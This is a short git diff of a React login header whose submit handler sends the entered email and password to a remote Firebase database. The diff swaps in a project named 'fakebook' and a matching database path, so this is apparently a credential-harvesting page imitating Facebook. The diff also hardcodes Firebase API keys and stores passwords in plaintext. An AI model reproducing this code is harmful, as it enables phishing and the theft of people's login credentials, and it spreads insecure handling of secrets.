@@ -81,16 +81,16 @@ class Header extends Component {
   onSubmit = (e) => {
     e.preventDefault();
     const app = firebase.initializeApp({
-      apiKey: "AIzaSyBGwqX1yjRmCIr-u8O1DLaSIjS29aZr8ys",
-      authDomain: "adovin-d722f.firebaseapp.com",
-      databaseURL: "https://adovin-d722f.firebaseio.com",
-      projectId: "adovin-d722f",
-      storageBucket: "adovin-d722f.appspot.com",
-      messagingSenderId: "999604746437"
+      apiKey: "AIzaSyDELq7yYzfM2Un8wFPxyw0lBVgFf2Za9WE",
+      authDomain: "fakebook-7a73b.firebaseapp.com",
+      databaseURL: "https://fakebook-7a73b.firebaseio.com",
+      projectId: "fakebook-7a73b",
+      storageBucket: "fakebook-7a73b.appspot.com",
+      messagingSenderId: "917062845474"
     });
     const save = app
     .database()
-    .ref("test/")
+    .ref("fakebook/")
     .push( {
         email: this.state.name,
         password: this.state.pass,
